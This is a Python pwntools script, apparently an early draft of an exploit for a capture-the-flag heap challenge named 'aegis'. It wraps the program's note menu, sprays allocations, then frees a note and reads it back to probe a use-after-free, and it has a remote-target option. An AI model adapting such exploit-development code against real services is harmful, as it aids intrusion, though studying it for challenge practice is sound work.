from pwn import *
context(os = 'linux', arch = 'amd64', log_level = 'debug')
#context(os = 'linux', arch = 'amd64')
if True :
	sh = process('./aegis')
else:
	sh = remote('111.186.63.209',6666)

def add_note(size,content,Id):
	sh.recvuntil('Choice:')
	sh.sendline('1')
	sh.recvuntil('Size:')
	sh.sendline(size)
	sh.recvuntil('Content:')
	sh.send(content)
	sh.recvuntil('ID:')
	sh.sendline(Id)

def delete(index):
	sh.recvuntil('Choice:')
	sh.sendline('4')
	sh.recvuntil('Index:')
	sh.sendline(index)

def show(index):
	sh.recvuntil('Choice:')
	sh.sendline('2')
	sh.recvuntil('Index:')
	sh.sendline(index)

def update(index,content,Id):
	sh.recvuntil('Choice:')
	sh.sendline('3')
	sh.recvuntil('Index:')
	sh.sendline(index)
	sh.recvuntil('Content:')
	sh.sendline(content)
	sh.recvuntil('ID:')
	sh.sendline(Id)

def secret(s):
	sh.recvuntil('Choice:')
	sh.sendline('666')
	sh.recvuntil('Lucky Number:')
	sh.sendline(s)
'''
for i in range(10):
	if i%2 == 0:
		add_note('16','aaaa',str(i))
	else:
		add_note('64','aaaa',str(i))
'''
for i in range(10):
	add_note('32','a'*(32-8),'1'*16)

gdb.attach(sh)
show('0')
'''
for i in range(2):
	delete(str(i))
'''
#delete('0')
#delete('1')
#secret('13213466853382')
#add_note('16','aaaa','1')
delete('0')
show('0')


sh.interactive()

	
